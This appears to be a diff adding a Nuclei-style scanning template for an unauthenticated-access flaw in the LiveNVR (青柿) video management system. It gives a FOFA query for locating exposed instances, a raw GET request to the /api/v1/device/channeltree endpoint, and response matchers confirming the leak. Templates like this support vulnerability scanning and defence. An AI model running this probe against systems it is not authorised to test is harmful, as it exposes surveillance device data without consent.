@@ -1,0 +1,23 @@
+id: livenvr-shiping-channeltree-unauth
+
+info:
+  name: livenvr-shiping-channeltree-unauth
+  author: unknow
+  severity: high
+  description: livenvr 青柿视频管理系统 channeltree 存在未授权访问漏洞。
+  tags: livenvr,unauth
+  metadata:
+    fofa-qeury: body="js/liveplayer-lib.min.js" && body="css/index"
+
+http:
+  - raw:
+      - |              
+        GET /api/v1/device/channeltree?serial=&pcode HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:     
+      - type: dsl
+        name: unauth
+        dsl:
+          - "status_code == 200 && contains(body,'[') && contains(body,'customName') && contains(header,'application/json')" 
